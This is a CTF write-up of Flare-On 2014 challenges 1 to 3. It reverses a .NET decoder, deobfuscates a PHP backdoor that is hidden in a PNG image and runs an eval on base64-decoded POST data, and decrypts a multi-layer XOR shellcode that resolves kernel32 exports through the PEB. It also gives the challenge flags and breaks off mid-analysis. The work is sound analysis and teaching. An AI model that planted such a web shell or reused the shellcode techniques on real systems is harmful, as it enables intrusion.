# Flare-On 1 (2014)

## Sources

You can download the relevant files on this page: <https://github.com/fareedfauzi/Flare-On-Challenges/tree/master/Challenges/2014/Flare-on%201>.

### Challenge 01

Hashes of the archive (`C1.zip`) containing the files of the challenge:

Hash | Value
-|-
MD5 | 7094c69959f626f8078145ab75abbbd0
SHA1 | 0e5895e65fe0f50275047bfb033ed272728ad4eb
SHA256 | 038e9ad33a0529337b0b0c30e37ae92787d0f0fb784e4c41cf2f36b020a5542e

Once you extract from the *Win32 Cabinet Self-Extractor* (`C1.exe`), you'll find yourself with a Windows executable written in `.NET`.

Opening the binary with `dnSpy`, I noticed the following function:

```cs
private void btnDecode_Click(object sender, EventArgs e)
{
    this.pbRoge.Image = Resources.bob_roge;
    byte[] dat_secret = Resources.dat_secret;
    string text = "";
    foreach (byte b in dat_secret)
    {
        text += (char)((b >> 4 | ((int)b << 4 & 240)) ^ 41);
    }
    text += "\0";
    string text2 = "";
    for (int j = 0; j < text.Length; j += 2)
    {
        text2 += text[j + 1];
        text2 += text[j];
    }
    string text3 = "";
    for (int k = 0; k < text2.Length; k++)
    {
        char c = text2[k];
        text3 += (char)((byte)text2[k] ^ 102);
    }
    this.lbl_title.Text = text3;
}
```

As you may infer from this code, the function is applied to a button of a GUI program. When the user clicks on the button, this function `btnDecode_Click` is executed.

The most interesting part of the code is the following:

```cs
byte[] dat_secret = Resources.dat_secret;
string text = "";

foreach (byte b in dat_secret)
{
    text += (char)((b >> 4 | ((int)b << 4 & 240)) ^ 41);
}
```

It seems to retrieve a resource (from the `.rsrc` section) and then performs some bitwise operations on each byte of the resource data.

There are two ways to get the flag for this challenge:

- debugging the application (put a breakpoint at the beginning of the function `btnDecode_Click` and start the application)
- writing a small script to decode the value

I used the first approach, since it's easier and faster. The flag should be the following: `3rmahg3rd.b0b.d0ge@flare-on.com`.

However, I also wanted to test whether I could decode it manually. To retrieve the resource, you can use `dnSpy`:

- go to `Resources`
- right-click on *rev_challenge_1.dat_secret.encode*
- select *Show in Hex editor*
- *Ctr-C* to copy the hex bytes

```py
encoded = "A1B5448414E4A1B5D470B491B470D491E4C496F45484B5C440647470A46444"
encoded_bytes = bytearray.fromhex(encoded)

decoded_list = [chr((b >> 4 | (b << 4 & 240)) ^ 41) for b in encoded_bytes]
print("".join(decoded_list))
# 3rmahg3rd.b0b.d0ge@flare-on.com
```

I successfully managed to decode it manually!

### Challenge 02

Hashes of the archive (`C2.zip`) containing the files of the challenge:

Hash | Value
-|-
MD5 | 74ea6bd7a2e19cfd6096614d7d9e8e0f
SHA1 | 32b08a345a4246526e8ecd73cacb8ceef3c32e9e
SHA256 | 407c11647b9c58f41daba5a6b85f04ac2a0c31bab9eefe3362c2805329a59bd1

I had some problems extracting the files from the archive `C2.zip`, due the `unzip` not supporting the compression algorithm *PK 5.1*. In the end, I managed to extract it this way:

```bash
# password: malware
7x x C2.zip -ochall_02
```

Inside, there are two files:

```txt
.
├── home.html
└── img
    └── flare-on.png
```

While the HTML file doesn't contain anything useful, the image `flare-on.png` contains some PHP code, while still being a valid image!

If you were to run `strings` on the latter, you would find this code:

```php
<?php

$terms = array("M", "Z", "]", "p", "\\", "w", "f", "1", "v", "<", "a", "Q", "z", " ", "s", "m", "+", "E", "D", "g", "W", "\"", "q", "y", "T", "V", "n", "S", "X", ")", "9", "C", "P", "r", "&", "\'", "!", "x", "G", ":", "2", "~", "O", "h", "u", "U", "@", ";", "H", "3", "F", "6", "b", "L", ">", "^", ",", ".", "l", "$", "d", "`", "%", "N", "*", "[", "0", "}", "J", "-", "5", "_", "A", "=", "{", "k", "o", "7", "#", "i", "I", "Y", "(", "j", "/", "?", "K", "c", "B", "t", "R", "4", "8", "e", "|");

$order = array(59, 71, 73, 13, 35, 10, 20, 81, 76, 10, 28, 63, 12, 1, 28, 11, 76, 68, 50, 30, 11, 24, 7, 63, 45, 20, 23, 68, 87, 42, 24, 60, 87, 63, 18, 58, 87, 63, 18, 58, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 17, 37, 63, 58, 37, 91, 63, 83, 43, 87, 42, 24, 60, 87, 93, 18, 87, 66, 28, 48, 19, 66, 63, 50, 37, 91, 63, 17, 1, 87, 93, 18, 45, 66, 28, 48, 19, 40, 11, 25, 5, 70, 63, 7, 37, 91, 63, 12, 1, 87, 93, 18, 81, 37, 28, 48, 19, 12, 63, 25, 37, 91, 63, 83, 63, 87, 93, 18, 87, 23, 28, 18, 75, 49, 28, 48, 19, 49, 0, 50, 37, 91, 63, 18, 50, 87, 42, 18, 90, 87, 93, 18, 81, 40, 28, 48, 19, 40, 11, 7, 5, 70, 63, 7, 37, 91, 63, 12, 68, 87, 93, 18, 81, 7, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 18, 17, 37, 0, 50, 5, 40, 42, 50, 5, 49, 42, 25, 5, 91, 63, 50, 5, 70, 42, 25, 37, 91, 63, 75, 1, 87, 93, 18, 1, 17, 80, 58, 66, 3, 86, 27, 88, 77, 80, 38, 25, 40, 81, 20, 5, 76, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 7, 88, 32, 45, 7, 90, 52, 80, 58, 5, 70, 63, 7, 5, 66, 42, 25, 37, 91, 0, 12, 50, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 48, 19, 7, 63, 50, 5, 37, 0, 24, 1, 87, 0, 24, 72, 66, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 1, 87, 93, 18, 11, 66, 28, 18, 87, 70, 28, 48, 19, 7, 63, 50, 5, 37, 0, 18, 1, 87, 42, 24, 60, 87, 0, 24, 17, 91, 28, 18, 75, 49, 28, 18, 45, 12, 28, 48, 19, 40, 0, 7, 5, 37, 0, 24, 90, 87, 93, 18, 81, 37, 28, 48, 19, 49, 0, 50, 5, 40, 63, 25, 5, 91, 63, 50, 5, 37, 0, 18, 68, 87, 93, 18, 1, 18, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 90, 87, 0, 24, 72, 37, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 48, 19, 40, 90, 25, 37, 91, 63, 18, 90, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 75, 70, 28, 48, 19, 40, 90, 58, 37, 91, 63, 75, 11, 79, 28, 27, 75, 3, 42, 23, 88, 30, 35, 47, 59, 71, 71, 73, 35, 68, 38, 63, 8, 1, 38, 45, 30, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 23, 75, 77, 1, 28, 1, 43, 52, 31, 19, 75, 81, 40, 30, 75, 1, 27, 75, 77, 35, 47, 59, 71, 71, 71, 73, 21, 4, 37, 51, 40, 4, 7, 91, 7, 4, 37, 77, 49, 4, 7, 91, 70, 4, 37, 49, 51, 4, 51, 91, 4, 37, 70, 6, 4, 7, 91, 91, 4, 37, 51, 70, 4, 7, 91, 49, 4, 37, 51, 6, 4, 7, 91, 91, 4, 37, 51, 70, 21, 47, 93, 8, 10, 58, 82, 59, 71, 71, 71, 82, 59, 71, 71, 29, 29, 47);

$do_me = "";
for ($i = 0; $i < count($order); $i++)
{
    $do_me = $do_me.$terms[$order[$i]];
}

eval($do_me);
?>
```

To de-obfuscate the code, I simply replaced the `eval` function with an `echo`:

```php
$_ = 'aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx4NEZceDU0XHg2QVw5N1x4NzZceDYxXHgzNVx4NjNceDcyXDk3XHg3MFx4NDFcODRceDY2XHg2Q1w5N1x4NzJceDY1XHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbIlw5N1w0OVx4MzFcNjhceDRGXHg1NFwxMTZcMTA0XHg2MVwxMTZceDQ0XDc5XHg1NFwxMDZcOTdcMTE4XDk3XDUzXHg2M1wxMTRceDYxXHg3MFw2NVw4NFwxMDJceDZDXHg2MVwxMTRcMTAxXHg0NFw2NVx4NTNcNzJcMTExXHg2RVx4NDRceDRGXDg0XDk5XHg2Rlx4NkQiXSkpOyB9';
$__ = 'JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7';
$___ = "\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65";

eval($___($__));
```

This one is a little more complicated. First, the variable `$___` is the string `base64_decode` encoded to hex/decimal notation.

Once again, replacing `eval` with `echo` reveals the next block of code:

```php
$code = base64_decode($_);
eval($code);
```

Once more:

```php
if(isset($_POST["\97\49\49\68\x4F\84\116\x68\97\x74\x44\x4F\x54\x6A\97\x76\x61\x35\x63\x72\97\x70\x41\84\x66\x6C\97\x72\x65\x44\65\x53\72\111\110\68\79\84\99\x6F\x6D"]))
{
    eval(base64_decode($_POST["\97\49\x31\68\x4F\x54\116\104\x61\116\x44\79\x54\106\97\118\97\53\x63\114\x61\x70\65\84\102\x6C\x61\114\101\x44\65\x53\72\111\x6E\x44\x4F\84\99\x6F\x6D"]));
}
```

To decode the two strings, I used some python code:

```py
l = [97, 49, 49, 68, 0x4F, 84, 116, 0x68, 97, 0x74, 0x44, 0x4F, 0x54, 0x6A, 97, 0x76, 0x61, 0x35, 0x63, 0x72, 97, 0x70, 0x41, 84, 0x66, 0x6C, 97, 0x72, 0x65, 0x44, 65, 0x53, 72, 111, 110, 68, 79, 84, 99, 0x6F, 0x6D]
"".join([chr(x) for x in l])
# a11DOTthatDOTjava5crapATflareDASHonDOTcom

m = [97, 49, 0x31, 68, 0x4F, 0x54, 116, 104, 0x61, 116, 0x44, 79, 0x54, 106, 97, 118, 97, 53, 0x63, 114, 0x61, 0x70, 65, 84, 102, 0x6C, 0x61, 114, 101, 0x44, 65, 0x53, 72, 111, 0x6E, 0x44, 0x4F, 84, 99, 0x6F, 0x6D]
"".join([chr(x) for x in m])
# a11DOTthatDOTjava5crapATflareDASHonDOTcom
```

In both cases, the resulting decoded string is *a11DOTthatDOTjava5crapATflareDASHonDOTcom*, so the flag should be the following:

```txt
a11.that.java5crap@flare-on.com
```

### Challenge 03

Hashes of the archive (`C3.zip`) containing the files of the challenge:

Hash | Value
-|-
MD5 | 84d6581b485a8580092a20bc614bb660
SHA1 | 06ea4adb5c22b46c8751402cd20ffd73ce72dd4b
SHA256 | e81a25edd426d9cdcefe5ca06d8ddb21e248100e2f1150dea5834f420b64652b 

Once extracted, I found a strange file named `such_evil`:

```bash
file such_evil
# such_evil:          PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows
```

According to its properties, it's a Windows executable compiled for 32-bit `x86` systems.

As it could perform some malicious operations (hypothetical case), I chose to start by reversing the binary.

Using the plugin [r2dec-js](https://github.com/wargio/r2dec-js) for `radare2` I managed to decompile some of the code executed after the entrypoint of the binary:

```cpp
#include <stdint.h>
 
uint32_t entry0 (void) {
    int32_t var_2ch;
    int32_t var_28h;
    int32_t var_24h;
    int32_t var_20h;
    int32_t var_1ch;
    int32_t var_18h;
    
    fcn_004025d1 (ebp - 0x18, ebp);

    eax = 0;
    *((ebp - 0x2c)) = eax;
    eax = 0x30000;
    eax = 0x10000;
    _controlfp (eax, eax);

    eax = 1;
    _set_app_type (eax);

    eax = 0;
    _getmainargs (ebp - 0x1c, ebp - 0x20, ebp - 0x24, eax, ebp - 0x2c);

    eax = *((ebp - 0x24));
    eax = *((ebp - 0x20));
    eax = *((ebp - 0x1c));
    eax = fcn_00401000 ();

    *((ebp - 0x28)) = eax;
    eax = *((ebp - 0x28));
    exit (eax);
    
    return eax;
}
```

What caught my interest isn't the first function (`fcn_004025d1`), but the last one: `fcn_00401000`.

Bases on the following decompiled instructions, it seems to fill a memory area with hard-coded bytes:

```nasm
┌ 5289: fcn.00401000 ();
│           ; var int32_t var_201h @ ebp-0x201
│           ; var int32_t var_200h @ ebp-0x200
│           ; var int32_t var_1ffh @ ebp-0x1ff
│           ; var int32_t var_1feh @ ebp-0x1fe
│           ; var int32_t var_1fdh @ ebp-0x1fd
│           ; var int32_t var_1fch @ ebp-0x1fc
│           ; var int32_t var_1fbh @ ebp-0x1fb
│           ; var int32_t var_1fah @ ebp-0x1fa
│           ; var int32_t var_1f9h @ ebp-0x1f9
│           ; var int32_t var_1f8h @ ebp-0x1f8
│           ; var int32_t var_1f7h @ ebp-0x1f7
│           ; var int32_t var_1f6h @ ebp-0x1f6
|
|           ; [omissis]
|
│           0x00401000      55             push ebp                    ; [00] -r-x section size 8192 named .text
│           0x00401001      89e5           mov ebp, esp
│           0x00401003      81ec04020000   sub esp, 0x204
│           0x00401009      90             nop
│           0x0040100a      b8e8000000     mov eax, 0xe8               ; 232
│           0x0040100f      8885fffdffff   mov byte [var_201h], al
│           0x00401015      b800000000     mov eax, 0
│           0x0040101a      888500feffff   mov byte [var_200h], al
│           0x00401020      b800000000     mov eax, 0
│           0x00401025      888501feffff   mov byte [var_1ffh], al
│           0x0040102b      b800000000     mov eax, 0
│           0x00401030      888502feffff   mov byte [var_1feh], al
│           0x00401036      b800000000     mov eax, 0
│           0x0040103b      888503feffff   mov byte [var_1fdh], al
│           0x00401041      b88b000000     mov eax, 0x8b               ; 139
│           0x00401046      888504feffff   mov byte [var_1fch], al
│           0x0040104c      b834000000     mov eax, 0x34               ; '4' ; 52
│           0x00401051      888505feffff   mov byte [var_1fbh], al
│           0x00401057      b824000000     mov eax, 0x24               ; '$' ; 36
│           0x0040105c      888506feffff   mov byte [var_1fah], al
│           0x00401062      b883000000     mov eax, 0x83               ; 131
│           0x00401067      888507feffff   mov byte [var_1f9h], al
|
|           ; [omissis]
|
│           0x00402462      8845f9         mov byte [var_7h], al
│           0x00402465      b880000000     mov eax, 0x80               ; 128
│           0x0040246a      8845fa         mov byte [var_6h], al
│           0x0040246d      b832000000     mov eax, 0x32               ; '2' ; 50
│           0x00402472      8845fb         mov byte [var_5h], al
│           0x00402475      b81c000000     mov eax, 0x1c               ; 28
│           0x0040247a      8845fc         mov byte [var_4h], al
│           0x0040247d      b895000000     mov eax, 0x95               ; 149
│           0x00402482      8845fd         mov byte [var_3h], al
│           0x00402485      b8c9000000     mov eax, 0xc9               ; 201
│           0x0040248a      8845fe         mov byte [var_2h], al
│           0x0040248d      b800000000     mov eax, 0
│           0x00402492      8845ff         mov byte [var_1h], al
│           0x00402495      8d85fffdffff   lea eax, [var_201h]
│           0x0040249b      ffd0           call eax
```

Besides the function prologue, and a `nop` instruction, it starts doing the following:

1. copy the byte `0xe8` to the variable `var_201h`, whose address is equal to **$ebp - 0x201**
1. copy `0x00` to $ebp-0x200
1. copy `0x00` to $ebp-0x1ff
1. copy `0x00` to $ebp-0x1fe
1. copy `0x00` to $ebp-0x1fd
1. copy `0x00` to $ebp-0x1fc
1. copy `0x8b` to $ebp-0x1fb

At the end of the function, the program loads the address of the local variable `var_201h`, and after that it jumps to that address, by means of the `CALL` instruction.

So far, this program seems to copy some bytes, supposedly shellcode, to the following address range:

```txt
+--- EBP - 0x201 ---+
|--- EBP - 0x200 ---|
|--- EBP - 0x1ff ---|
|--- EBP - 0x1fe ---|
|------ ... --------|
|------ ... --------|
|--- EBP - 0x003 ---|
|--- EBP - 0x002 ---|
+--- EBP - 0x001 ---+
```

The firs byte starts at the address `$EBP-0x201`, and the last on is stored at `$EBP-1`.

To extract this shellcode, I simply used some *bash magic*:

```bash
xxd -p such_evil | tr -d '\n' | grep -oE 'b8[a-f0-9]{2}000000' | tail +2 | head -n 513 | sed -E 's/b8(..)000000/\1/g' | tr -d '\n' | xxd -r -p > shellcode.bin
```

Once I extracted the shellcode, I could use `radare2` to analyze the assembly instructions:

```nasm
0x00000000      e800000000     call 5
0x00000005      8b3424         mov esi, dword [esp]
0x00000008      83c61c         add esi, 0x1c
0x0000000b      b9df010000     mov ecx, 0x1df              ; 479
0x00000010      83f900         cmp ecx, 0
0x00000013      7407           je 0x1c
0x00000015      803666         xor byte [esi], 0x66        ; [0x66:1]=110
0x00000018      46             inc esi
0x00000019      49             dec ecx
0x0000001a      ebf4           jmp 0x10
0x0000001c      e910000000     jmp 0x31
0x00000021      07             pop es
0x00000022      0802           or byte [edx], al
0x00000024      46             inc esi
0x00000025      1509460f12     adc eax, 0x120f4609
0x0000002a      46             inc esi
0x0000002b      0403           add al, 3
0x0000002d      010f           add dword [edi], ecx
0x0000002f      08150e131566   or byte [0x6615130e], dl    ; [0x6615130e:1]=255
0x00000035      660e           push cs
```

The instructions up to the offset `0x1c` can be converted to the following pseudo-code:

```cpp
#include <stdint.h>
 
void fcn_00000000 () {

    // after the two instructions, esi = 0x21
    esi = *(esp);
    esi += 0x1c;

    ecx = 0x1df;

    do
    {
        if (ecx == 0)
        {
            goto shellcode;
        }

        *(esi) ^= 0x66;
        esi += 1;
        ecx -= 1;
    } while (1);

shellcode:
    return void (*0x31)() ();
}
```

As you have noticed, the function loops `0x1df` times in order to `XOR` the bytes from the address `0x21` onwards, meaning until the byte `0x200`.

To replicate the decryption process, I used the following python script (alternative to `cyberchef`):

```py
with open("shellcode.bin", 'rb') as f:
    data = f.read()

    encrypted_shellcode = data[0x21:0x21 + 0x1df]

    decrypted_shellcode = bytearray()
    for enc_byte in encrypted_shellcode:
        decrypted_shellcode.append(enc_byte ^ 0x66)
    
    with open("shellcode2.bin", "wb") as f2:
        f2.write(decrypted_shellcode)
```

I found the string *and so it begins* at the beginning of the decrypted shellcode, which meant I was on the right track. Moreover, it meant the initial bytes must be skipped (being a string), and I needed to find the correct jump:

```cpp
shellcode:
    return void (*0x31)() ();
```

Looking back, I remembered the call to the offset `0x31`, exactly `0x10` bytes after the beginning of the decrypted data. Coincidentally, the previous string is 10-characters long, so the real instructions start right after the letter `s` of `begins`.

Therefore, I tweaked the script a bit in order to obtain the real shellcode:

```py
# [omissis]
    with open("shellcode2.bin", "wb") as f2:
        f2.write(decrypted_shellcode[0x10:])
```

Follows the disassembly of the decrypted shellcode:

```nasm
; set EBX to point to the string "nopasaurus"
0x00000000      6875730000     push 0x7375                 ; 'us'
0x00000005      6873617572     push 0x72756173             ; 'saur'
0x0000000a      686e6f7061     push 0x61706f6e             ; 'nopa'
0x0000000f      89e3           mov ebx, esp

; set ESI to offset 0x43
0x00000011      e800000000     call 0x16
0x00000016      8b3424         mov esi, dword [esp]
0x00000019      83c62d         add esi, 0x2d

; set ECX = 0x43 + 0x18c = 0x1cf
0x0000001c      89f1           mov ecx, esi
0x0000001e      81c18c010000   add ecx, 0x18c              ; 396

; set EAX to point to the byte following the XOR key
0x00000024      89d8           mov eax, ebx
0x00000026      83c00a         add eax, 0xa

; if EBX is equal to EAX, restore EBX to point to the start
; of the the XOR key
0x00000029      39d8           cmp eax, ebx
0x0000002b      7505           jne 0x32
0x0000002d      89e3           mov ebx, esp
0x0000002f      83c304         add ebx, 4

; check if we finished looping
0x00000032      39ce           cmp esi, ecx
0x00000034      7408           je 0x3e

; decrypt the encrypted byte through XOR
0x00000036      8a13           mov dl, byte [ebx]
0x00000038      3016           xor byte [esi], dl

; step to the next encrypted byte
0x0000003a      43             inc ebx
0x0000003b      46             inc esi
0x0000003c      ebeb           jmp 0x29
0x0000003e      e931000000     jmp 0x74
```

The instructions above can be converted to the following pseudo-code:

```cpp
int32_t fcn_00000000 (void)
{
    esi = 0x16;
    esi += 0x2d;

    ecx = esi;
    ecx += 0x18c;

    ebx = "nopasaurus";
    esp = &ebx;
    eax = &ebx;
    eax += 0xa;
    
    do
    {
        if (eax == ebx)
        {
            ebx = esp;
            ebx += 4;
        }

        if (esi == ecx)
        {
            goto shellcode;
        }

        dl = *(ebx);
        *(esi) ^= dl;

        ebx++;
        esi++;
    } while (1);
    
    // [omissis]
}
```

In brief, the program loops over the string `nopasaurus` in order to *XOR-decrypt* the shellcode stored in the range `0x43` to `0x1cf` (0x43 + 0x18c).

To decrypt it, I used once again a script:

```py
xor_key = "nopasaurus"

with open("shellcode2.bin", 'rb') as f:
    data = f.read()

    encrypted_shellcode = data[0x43:0x43 + 0x18c]
    decrypted_shellcode = bytearray()

    for index, enc_byte in enumerate(encrypted_shellcode):
        xor_byte = xor_key[index % len(xor_key)]
        decrypted_shellcode.append(enc_byte ^ ord(xor_byte))
    
    with open("shellcode3.bin", "wb") as f2:
        f2.write(decrypted_shellcode)
```

Using this script, I managed to decrypt shellcode, and I also found a string left by the authors:

> get ready to get nop'ed so damn hard in the paint

To get the real shellcode though, I had to calculate the offset based on the disassembly I got from radare.

```py
# [omissis]
    with open("shellcode3.bin", "wb") as f2:
        f2.write(decrypted_shellcode[0x74 - 0x43:])
```

Follows the decrypted shellcode:

```nasm
; set ESI = 0x5 + 0x1e = 0x23
0x00000000      e800000000     call 5
0x00000005      8b3424         mov esi, dword [esp]
0x00000008      83c61e         add esi, 0x1e

; set ECX = 0x138
0x0000000b      b938010000     mov ecx, 0x138              ; 312
0x00000010      83f900         cmp ecx, 0
0x00000013      7e0e           jle 0x23
0x00000015      8136624f6c47   xor dword [esi], 0x476c4f62 ; [0x476c4f62:4]=-1
0x0000001b      83c604         add esi, 4
0x0000001e      83e904         sub ecx, 4
0x00000021      ebed           jmp 0x10
0x00000023      ef             out dx, eax
```

This one is smaller, although it's becoming repetive: once again it uses the xor operation to decode some shellcode, however this time it does so by xoring 4 bytes at a time with the XOR key `0x476c4f62` (ASCII: *GlOb*).

```py
import struct

xor_key_bytes = bytearray.fromhex("476c4f62")
xor_key_unpacked = struct.unpack(">i", xor_key_bytes)[0]

with open("shellcode3.bin", 'rb') as f:
    encrypted_shellcode = f.read()

    with open("shellcode4.bin", "wb") as f2:
        for x in range(0x23, 0x23 + 0x138, 4):
            dword_unpacked = struct.unpack("<i", encrypted_shellcode[x:x+4])
            decoded_dword = dword_unpacked[0] ^ xor_key_unpacked
            decoded_dword_packed = struct.pack("<i", decoded_dword)

            f2.write(decoded_dword_packed)
```

The decrypted shellcode contains yet another decryption stub:

```nasm
; useless instructions
0x00000000      8d8000000000   lea eax, [eax]
0x00000006      8d8000000000   lea eax, [eax]
0x0000000c      90             nop
0x0000000d      90             nop
0x0000000e      90             nop
0x0000000f      90             nop

; XOR key: "omg is it almost over?!?"
0x00000010      68723f213f     push 0x3f213f72             ; 'r?!?'
0x00000015      68206f7665     push 0x65766f20             ; ' ove'
0x0000001a      686d6f7374     push 0x74736f6d             ; 'most'
0x0000001f      687420616c     push 0x6c612074             ; 't al'
0x00000024      6869732069     push 0x69207369             ; 'is i'
0x00000029      686f6d6720     push 0x20676d6f             ; 'omg '
0x0000002e      89e3           mov ebx, esp

; set ESI to 0x35 + 0x2d = 0x62
0x00000030      e800000000     call 0x35
0x00000035      8b3424         mov esi, dword [esp]
0x00000038      83c62d         add esi, 0x2d

; set ECX to offset 0x62 + 0xd6 = 0x138
; decrypt bytes from offset 0x62 to offset 0x138
0x0000003b      89f1           mov ecx, esi
0x0000003d      81c1d6000000   add ecx, 0xd6               ; 214

; set EAX to EBX+18, i.e. the character following the end of the XOR key
0x00000043      89d8           mov eax, ebx
0x00000045      83c018         add eax, 0x18

; if EAX and EBX are equal, it means we have to go back
; to the start of the XOR key
0x00000048      39d8           cmp eax, ebx
0x0000004a      7505           jne 0x51

; restore EBX to point to the XOR key
0x0000004c      89e3           mov ebx, esp
0x0000004e      83c304         add ebx, 4

; if we finished decrypting, jump to offset 0x5d, i.e. 0x7f
0x00000051      39ce           cmp esi, ecx
0x00000053      7408           je 0x5d

; xor the encrypted byte with the current char. of the XOR key
0x00000055      8a13           mov dl, byte [ebx]
0x00000057      3016           xor byte [esi], dl

; increase the index of the XOR key
0x00000059      43             inc ebx

; go back to decryot the next char
0x0000005b      ebeb           jmp 0x48
0x0000005d      e91d000000     jmp 0x7f

; first encrypted byte
0x00000062      1c18           sbb al, 0x18
```

Using the script below, I successfully decrypted the encrypted shellcode:

```py
xor_key_bytes = "omg is it almost over?!?"

with open("shellcode4.bin", 'rb') as f:
    encrypted_shellcode = f.read()[0x62:]

    with open("shellcode5.bin", "wb") as f2:
        for x in range(0, 0x138 - 0x62):
            decrypted_byte = encrypted_shellcode[x] ^ ord(xor_key_bytes[x % len(xor_key_bytes)])

            f2.write(chr(decrypted_byte).encode())
```

As before, the first bytes aren't assembly instructions, but a string left by the author of the challenge:

```bash
xxd shellcode5.bin          
# 00000000: 7375 6368 2e35 6833 3131 3031 3031 3031  such.5h311010101
# 00000010: 4066 6c61 7265 2d6f 6e2e 636f 6d68 6e74  @flare-on.comhnt
```

As you can clearly see, the flag for this challenge is `such.5h311010101@flare-on.co`.

The rest of the shellcode prints the message *aaaaaand i'm spent*:

```nasm
; set EBX to point to the string "aaaaaand i'm spent"
; it's the XOR key
0x00000000      686e740000     push 0x746e                 ; 'nt'
0x00000005      6820737065     push 0x65707320             ; ' spe'
0x0000000a      682069276d     push 0x6d276920             ; ' i'm'
0x0000000f      6861616e64     push 0x646e6161             ; 'aand'
0x00000014      6861616161     push 0x61616161             ; 'aaaa'
0x00000019      89e3           mov ebx, esp

; set ESI = 0x20 + 0x28 = 0x48
0x0000001b      e800000000     call 0x20
0x00000020      8b3424         mov esi, dword [esp]
0x00000023      83c628         add esi, 0x28               ; 40

; set ECX = 0x48 + 0x71 = 0xb9
0x00000026      89f1           mov ecx, esi
0x00000028      81c171000000   add ecx, 0x71               ; 113

; set EAX to point to the character following the XOR key
0x0000002e      89d8           mov eax, ebx
0x00000030      83c012         add eax, 0x12               ; 18

; if EAX is equal to EBX go back to the first char. of
; the XOR key
0x00000033      39d8           cmp eax, ebx
0x00000035      7505           jne 0x3c
0x00000037      89e3           mov ebx, esp
0x00000039      83c304         add ebx, 4

; if it's finished looping, jump to 0x48
0x0000003c      39ce           cmp esi, ecx
0x0000003e      7408           je 0x48

; xor the encrypted byte with the char. of the XOR key
0x00000040      8a13           mov dl, byte [ebx]
0x00000042      3016           xor byte [esi], dl

; step to the next encrypted byte and to the next char
; of the XOR key
0x00000044      43             inc ebx
0x00000045      46             inc esi

; go back to decryot the next encrypted byte
0x00000046      ebeb           jmp 0x33

; encrypted bytes (garbage)
0x00000048      50             push eax
0x00000049      b3d3           mov bl, 0xd3                ; 211
```

To decrypt it:

```py
xor_key_bytes = "aaaaaand i'm spent"

with open("shellcode5.bin", 'rb') as f:
    encrypted_shellcode = f.read()[0x48:]
    decrypted_shellcode = bytearray()

    for x in range(0, 0x71):
        decrypted_byte = encrypted_shellcode[x] ^ ord(xor_key_bytes[x % len(xor_key_bytes)])
        decrypted_shellcode.append(decrypted_byte)

    with open("shellcode6.bin", "wb") as f2:
        f2.write(decrypted_shellcode)
```

This shellcode is the last one. While it was more complicated than the previous ones, and I already found the flag, I chose to analyze it anyway to improve my skills:

```nasm
; set EDX to point to the PEB (FS:[0x30])
; PEB = Process Environment Block
0x00000000      31d2           xor edx, edx
0x00000002      b230           mov dl, 0x30                ; '0' ; 48
0x00000004      648b12         mov edx, dword fs:[edx]

; get the address of the PEB_LDR_DATA structure
; 0x0C bytes from the start, the PEB contains a pointer
; to PEB_LDR_DATA structure, which provides information
; about the loaded DLLs.
0x00000007      8b520c         mov edx, dword [edx + 0xc]

; address of PEB-> Ldr.InInitializationOrderModuleList.Flink
; LDR_MODULE ( InInitializationOrderModuleList )
0x0000000a      8b521c         mov edx, dword [edx + 0x1c]

; get the base address of the module
; ImgBase
0x0000000d      8b4208         mov eax, dword [edx + 8]

; address of the module’s name in the form of its Unicode string
0x00000010      8b7220         mov esi, dword [edx + 0x20]

; store the pointer of the next module
0x00000013      8b12           mov edx, dword [edx]

; check if the byte of index 0xc is the character '3'
; examples:
; k.e.r.n.e.l.3.2...d.l.l. -> true
; n.t.d.l.l...d.l.l. -> false
0x00000015      807e0c33       cmp byte [esi + 0xc], 0x33

; if the comparison is false, then go back and check the name;
; of the next module
0x00000019      75f2           jne 0xd

; RVA (Relative Virtual Address) of the PE Signature
; which is equal to 0x5045
0x0000001b      89c7           mov edi, eax
0x0000001d      03783c         add edi, dword [eax + 0x3c]

; RVA of the Export Table of the module
; MODULE_BASE_ADDRESS + 0x3c + 0x78
0x00000020      8b5778         mov edx, dword [edi + 0x78]

; get the absolute address of the export table
; ABS_ADDRESS = RVA + MODULE_BASE_ADDRESS
0x00000023      01c2           add edx, eax

; RVA of the Name Pointer Table, which holds pointers
; to the names (strings) of the functions.
0x00000025      8b7a20         mov edi, dword [edx + 0x20]

; get the absolute address of the Name Pointer Table
0x00000028      01c7           add edi, eax

; set ESI to the RVA of the first function of the
; Name Pointer Table, and calculate the absolute address
0x0000002a      31ed           xor ebp, ebp
0x0000002c      8b34af         mov esi, dword [edi + ebp*4]
0x0000002f      01c6           add esi, eax

; increase EBP, because it's used at 0x0000002c to calculate
; the next RVA to retrieve
0x00000031      45             inc ebp

; compare the first bytes with "Fata"
0x00000032      813e46617461   cmp dword [esi], 0x61746146
; if the strings aren't equal, go back to 0x2c to check
; the next function
0x00000038      75f2           jne 0x2c

; compare the other 4 bytes from index 0x8 with "Exit"
0x0000003a      817e08457869.  cmp dword [esi + 8], 0x74697845
0x00000041      75e9           jne 0x2c

; get the RVA of the Ordinal Table (Export Table + 0x24)
; it holds the position of the function in the Address Table
0x00000043      8b7a24         mov edi, dword [edx + 0x24]

; get the absolute address of the Ordinal Table
0x00000046      01c7           add edi, eax

; to get the ordinal number of the function, we have to
; perform the following calculation:
